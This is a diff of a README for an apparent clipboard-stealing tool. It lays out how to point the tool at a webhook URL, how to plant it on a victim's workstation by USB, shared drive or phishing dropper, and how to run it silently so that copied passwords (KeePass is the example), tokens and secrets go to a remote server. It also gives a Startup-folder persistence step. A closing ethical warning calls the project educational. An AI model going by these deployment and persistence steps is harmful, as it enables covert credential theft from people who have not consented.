@@ -36,13 +36,42 @@ Start a server or use a free webhook service to receive incoming POST requests.
 For example, head over to [https://webhook.site](https://webhook.site) — it will instantly generate a **unique URL** for you.
 ![image](https://github.com/user-attachments/assets/dc40c327-0ec0-4f1a-85df-3ebb7f31e0f0)
 
+📸 _Copy that URL into your `yourhttp_server.txt` file._
 I will use this URL and copy it into the project's yourhttp_server.txt file
 ![image](https://github.com/user-attachments/assets/5a4aac05-c3da-4e6a-b32e-0d4c4b8458bc)
 Your project is ready, now find a vector to copy the project to the victim's workstation(s).
 
-2. On the victim's workstation, launch RUN.VBS (double-click).
-3. Back at your headquarters, monitor the activity on your server interface.
-4. During the day, your user will likely copy and paste credentials into memory, which you can retrieve live.
+---
+
+### 2. Deploy on the target machine
+
+Use any vector to place the folder on the victim’s workstation (USB, shared drive, phishing dropper, etc.).
+
+On the target system, simply **double-click `RUN.vbs`**.  
+This will launch the clipboard watcher **without any visible window** or trace in the taskbar.
+
+---
+
+### 3. Monitor remotely
+
+Back at your command center, monitor the clipboard activity via the webhook interface.  
+During the day, users often copy credentials, temporary secrets, or tokens. With this agent in place, you get them live.
+
+📸 _Example: Passwords copied from KeePass can be intercepted in real time._
+
+---
+
+## 🪄 Optional: Make it persistent
+
+To launch the agent at every startup, simply **drop a shortcut to `RUN.vbs`** into the following folder:
+
+```
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+✅ You now have a **persistent, silent agent** that posts clipboard data to your server on every reboot.
+
+---
 
 Example with KeePass
 ![image](https://github.com/user-attachments/assets/0653659d-7952-4948-aadd-07adc0c67ab9)
@@ -50,12 +79,22 @@ get the result !
 ![image](https://github.com/user-attachments/assets/5e47b1d2-1d49-44d1-8913-68ce8964fe8c)
 
 
-To go further, you can launch everything automatically when Windows starts:
-Place a shortcut to the .vbs file in:
-%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+## 🔐 Ethical Warning
 
-You now have a persistent, silent agent that posts the clipboard to a remote server.
+This kind of tool has the potential for misuse. **This project is strictly educational.**
 
-🔐 Ethical Warning
-This type of script has the potential for malicious use. This project is strictly educational.
-Any clipboard monitoring must be done with the user's explicit consent, within a legal and ethical framework (e.g., internal testing, training, lab environment, etc.).
+⚠️ Clipboard monitoring must **only** be performed with **informed, explicit consent**, and within a **legal and ethical context** — such as:
+
+- Internal red teaming
+- Blue team training labs
+- Consent-based security assessments
+- Cybersecurity awareness demos
+
+---
+
+## 🧠 Takeaways
+
+This project is a minimal, effective example of how simple scripts can become **powerful reconnaissance tools**.  
+It also serves as a reminder of how seemingly harmless features — like copy/paste — can become a **data exfiltration vector**.
+
+Use responsibly. Hack ethically. 🔐
